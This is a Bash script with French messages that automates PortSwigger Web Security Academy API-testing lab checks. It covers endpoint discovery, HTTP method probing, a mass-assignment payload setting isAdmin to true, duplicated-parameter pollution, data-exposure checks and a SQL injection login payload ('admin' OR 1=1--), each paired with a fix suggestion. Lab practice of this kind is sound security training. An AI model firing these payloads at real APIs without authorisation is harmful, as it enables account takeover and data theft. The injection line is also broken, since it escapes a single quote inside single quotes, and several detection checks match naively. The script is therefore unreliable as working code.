#!/bin/bash

# PortSwigger API Testing Challenges - Automated Bash Script with Functions and Suggestions
# Requires: curl, jq (optional for JSON parsing)
# Usage: Edit the variables below with your session cookies, tokens, and target URLs.

# --------- Configuration (edit these values) ---------
BASE_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your_session_cookie>"
AUTH_HEADER="Authorization: Bearer <your_api_token>"   # If needed
USER_ID="123"
# -----------------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Reconnaissance des endpoints API
api_recon() {
    print_sep
    echo "[1] Reconnaissance des endpoints API"
    echo "Recherche des endpoints courants..."
    for path in "/api" "/api/users" "/api/products" "/api/admin" "/swagger/index.html" "/openapi.json"; do
        resp=$(curl -sk -b "$COOKIE" -H "$AUTH_HEADER" "$BASE_URL$path")
        code=$(curl -sk -o /dev/null -w "%{http_code}" -b "$COOKIE" -H "$AUTH_HEADER" "$BASE_URL$path")
        echo "$BASE_URL$path => HTTP $code"
        if [[ "$code" == "200" ]]; then
            echo ">> [INFO] Endpoint trouvé : $BASE_URL$path"
        fi
    done
    echo "Pensez à inspecter les JS, documentation OpenAPI, ou utiliser Burp pour extraire d'autres endpoints."
}

# 2. Test des méthodes HTTP supportées
test_http_methods() {
    print_sep
    echo "[2] Test des méthodes HTTP supportées sur /api/users/$USER_ID"
    for method in GET POST PUT PATCH DELETE OPTIONS; do
        resp=$(curl -sk -X $method -b "$COOKIE" -H "$AUTH_HEADER" "$BASE_URL/api/users/$USER_ID")
        code=$(curl -sk -o /dev/null -w "%{http_code}" -X $method -b "$COOKIE" -H "$AUTH_HEADER" "$BASE_URL/api/users/$USER_ID")
        echo "Méthode $method => HTTP $code"
    done
    echo ">> [INFO] Si une méthode inattendue fonctionne, suspectez une surface d'attaque élargie."
}

# 3. Test de mass assignment
test_mass_assignment() {
    print_sep
    echo "[3] Test de mass assignment (ex : isAdmin)"
    payload='{"username":"wiener","email":"wiener@example.com","isAdmin":true}'
    resp=$(curl -sk -X PATCH -b "$COOKIE" -H "$AUTH_HEADER" -H "Content-Type: application/json" -d "$payload" "$BASE_URL/api/users/$USER_ID")
    echo "Réponse à la tentative de mass assignment : $resp"
    if [[ "$resp" == *"isAdmin"* && "$resp" == *"true"* ]]; then
        echo ">> [ALERTE] Mass assignment détecté : l'utilisateur a pu modifier un champ sensible !"
        echo ">> PROPOSITION : Filtrer côté serveur les champs modifiables et ignorer les champs sensibles dans le body."
    else
        echo ">> [OK] Pas de mass assignment détecté selon ce test."
    fi
}

# 4. Test de pollution de paramètres (server-side parameter pollution)
test_param_pollution() {
    print_sep
    echo "[4] Test de pollution de paramètres côté serveur"
    resp=$(curl -sk -b "$COOKIE" -H "$AUTH_HEADER" "$BASE_URL/api/search?user=wiener&user=admin")
    echo "Réponse à la requête avec paramètres dupliqués : $resp"
    if [[ "$resp" == *"admin"* ]]; then
        echo ">> [ALERTE] Pollution de paramètres détectée : le serveur traite plusieurs valeurs pour un même paramètre."
        echo ">> PROPOSITION : Valider côté serveur qu'un paramètre ne soit présent qu'une seule fois."
    else
        echo ">> [OK] Pas de pollution de paramètres détectée."
    fi
}

# 5. Test d'exposition excessive de données
test_data_exposure() {
    print_sep
    echo "[5] Test d'exposition excessive de données"
    resp=$(curl -sk -b "$COOKIE" -H "$AUTH_HEADER" "$BASE_URL/api/users/$USER_ID")
    echo "Données retournées : $resp"
    if [[ "$resp" == *"isAdmin"* || "$resp" == *"token"* || "$resp" == *"password"* ]]; then
        echo ">> [ALERTE] Données sensibles exposées dans la réponse !"
        echo ">> PROPOSITION : Restreindre les champs retournés aux seuls nécessaires côté API."
    else
        echo ">> [OK] Pas d'exposition excessive de données détectée."
    fi
}

# 6. Test de validation des entrées (injection)
test_input_validation() {
    print_sep
    echo "[6] Test de validation des entrées (injection)"
    payload='{"username":"admin\' OR 1=1--","password":"test"}'
    resp=$(curl -sk -X POST -b "$COOKIE" -H "$AUTH_HEADER" -H "Content-Type: application/json" -d "$payload" "$BASE_URL/api/login")
    echo "Réponse à la tentative d'injection : $resp"
    if [[ "$resp" == *"token"* || "$resp" == *"admin"* ]]; then
        echo ">> [ALERTE] Injection possible ou absence de filtrage des entrées !"
        echo ">> PROPOSITION : Valider et filtrer strictement toutes les entrées utilisateur côté serveur."
    else
        echo ">> [OK] Pas d'injection détectée selon ce test."
    fi
}

# Main script execution
echo "=== PortSwigger API Testing Automated Checks ==="
api_recon
test_http_methods
test_mass_assignment
test_param_pollution
test_data_exposure
test_input_validation

print_sep
echo "[SYNTHÈSE]"
echo "Comparez les réponses ci-dessus pour identifier d'éventuelles failles."
echo "Pour chaque alerte, appliquez les propositions correctives recommandées."
echo "Documentation PortSwigger : https://portswigger.net/web-security/api-testing"
print_sep

# End of script

